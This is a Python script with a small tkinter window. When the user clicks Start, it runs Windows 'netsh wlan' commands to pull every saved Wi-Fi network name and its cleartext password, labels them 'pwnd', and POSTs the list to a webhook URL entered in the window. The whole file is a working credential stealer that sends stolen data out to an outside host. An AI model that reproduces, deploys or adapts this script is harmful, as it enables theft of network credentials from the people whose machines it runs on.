import tkinter as tk
import re
import requests
import subprocess
import sys


def get_wifi_passwords():
    # Lists and regex
    found_ssids = []
    pwnd = []
    wlan_profile_regex = r"All User Profile\s+:\s(.*)$"
    wlan_key_regex = r"Key Content\s+:\s(.*)$"

    # Use Python to execute Windows command
    get_profiles_command = subprocess.run(["netsh", "wlan", "show", "profiles"], stdout=subprocess.PIPE).stdout.decode()

    # Append found SSIDs to list
    matches = re.finditer(wlan_profile_regex, get_profiles_command, re.MULTILINE)
    for match in matches:
        for group in match.groups():
            found_ssids.append(group.strip())

    # Get cleartext password for found SSIDs and place into pwnd list
    for ssid in found_ssids:
        get_keys_command = subprocess.run(["netsh", "wlan", "show", "profile", ("%s" % (ssid)), "key=clear"],
                                          stdout=subprocess.PIPE).stdout.decode()
        matches = re.finditer(wlan_key_regex, get_keys_command, re.MULTILINE)
        for match in matches:
            for group in match.groups():
                pwnd.append({
                    "SSID": ssid,
                    "Password": group.strip()
                })

    # Check if any pwnd Wi-Fi exists, if not exit
    if len(pwnd) == 0:
        print("No Wi-Fi passwords found. Exiting...")
        return

    print("Wi-Fi Passwords found. Check your webhook...")

    # Send the passwords to your webhook
    final_payload = ""
    for pwnd_ssid in pwnd:
        final_payload += "[SSID:%s, Password:%s]\n" % (
            pwnd_ssid["SSID"], pwnd_ssid["Password"])  # Payload display format can be changed as desired

    r = requests.post(txt_webhook.get(), params="format=json", data=final_payload)


def clear_placeholder(event):
    if txt_webhook.get() == 'Enter your Webhook URL':
        txt_webhook.delete(0, tk.END)


def add_placeholder(event):
    if txt_webhook.get() == '':
        txt_webhook.insert(0, 'Enter your Webhook URL')


# Create a new tkinter window
window = tk.Tk()

# Create a new textbox for the webhook URL input
txt_webhook = tk.Entry(window, width=50)
txt_webhook.insert(0, 'Enter your Webhook URL')
txt_webhook.bind("<FocusIn>", clear_placeholder)
txt_webhook.bind("<FocusOut>", add_placeholder)
txt_webhook.pack()

# Create a new button to start the process
btn_start = tk.Button(window, width=20, text='Start', command=lambda: get_wifi_passwords())
btn_start.pack()

# Run the mainloop
window.mainloop()
